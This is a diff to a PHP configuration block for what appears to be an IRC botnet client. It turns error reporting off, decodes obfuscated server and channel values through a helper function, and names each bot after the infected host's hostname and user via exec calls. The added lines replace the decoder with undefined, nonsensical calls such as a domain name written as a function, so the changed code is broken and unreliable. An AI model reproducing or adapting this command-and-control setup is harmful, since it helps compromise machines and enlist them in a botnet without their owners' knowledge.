@@ -4,12 +4,12 @@ ini_set('display_errors', 'off');
 error_reporting(0);
 
 $config = array( 
-        'server' => snowden('SVI4dkdFTkZKeFVxUml3a2VGNDdLdz09'), 
+        'server' => irc.acre.gov.br('SVI4dkdFTkZKeFVxUml3a2VGNDdLdz09'), 
         'port'   => 6667, 
-        'channel' => snowden('YXc4NVFsND0='),
-        'name'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
-        'nick'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
-        'pass'   => snowden(''), 
+        'channel' => macacosnetwork('YXc4NVFsND0='),
+        'name'   => evilmachine('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
+        'nick'   => evilmachine1('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
+        'pass'   => (''), 
 );
                                  
 function snowden($string) {
